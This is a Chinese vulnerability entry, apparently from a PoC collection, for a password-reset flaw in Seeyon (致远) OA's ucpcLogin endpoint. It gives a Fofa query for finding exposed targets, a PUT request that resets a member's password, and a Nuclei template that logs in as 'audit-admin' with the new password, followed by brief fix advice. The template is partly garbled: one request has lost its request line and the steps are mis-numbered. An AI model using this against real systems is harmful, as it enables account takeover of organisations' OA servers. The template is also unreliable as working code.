# 致远OAucpcLogin存在密码重置漏洞

- **系统**：致远OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app="致远A8"`
- **请求**：`PUT /seeyon/rest/orgMember/-4401606663639775639/password/share.do HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="致远A8"
1. 部分界面如下
3、隐患url,复现如下
id: seeyon-ucpclogin-passwordreset
info:
name: seeyon-ucpclogin-passwordreset
author: m0be1
severity: critical
http:
- raw:
-
Host: {{Hostname}}
Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=
-
POST /seeyon/rest/authentication/ucpcLogin?login_username=audit-admin&login_password=share.do&ticket= HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
matchers:
- type: dsl
dsl:
- 'status_code==200 && contains_all(body_2,"ok") && contains_all(body,"audit-admin")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。